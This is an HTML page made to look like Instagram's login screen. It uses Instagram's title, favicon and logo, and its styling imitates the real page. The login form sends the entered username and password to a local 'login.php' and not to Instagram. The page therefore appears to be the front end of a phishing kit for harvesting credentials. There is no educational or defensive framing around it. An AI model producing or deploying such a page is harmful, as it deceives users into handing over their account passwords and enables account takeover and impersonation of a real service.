<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background-color: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .login-box {
      width: 350px;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }

    .login-box img.logo {
      width: 175px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: #fff;
      font-weight: bold;
      font-size: 14px;
      border-radius: 4px;
      margin-top: 10px;
      cursor: pointer;
    }

    .or {
      margin: 20px 0;
      font-size: 13px;
      color: #8e8e8e;
      position: relative;
    }

    .or::before, .or::after {
      content: '';
      background: #dbdbdb;
      height: 1px;
      width: 40%;
      position: absolute;
      top: 50%;
    }

    .or::before { left: 0; }
    .or::after { right: 0; }

    a.forgot {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
      margin-top: 12px;
      display: inline-block;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo" alt="Instagram logo">
    <form action="login.php" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <div class="or">OR</div>
    <a class="forgot" href="#">Forgot password?</a>
    <div class="signup">
      Donâ€™t have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
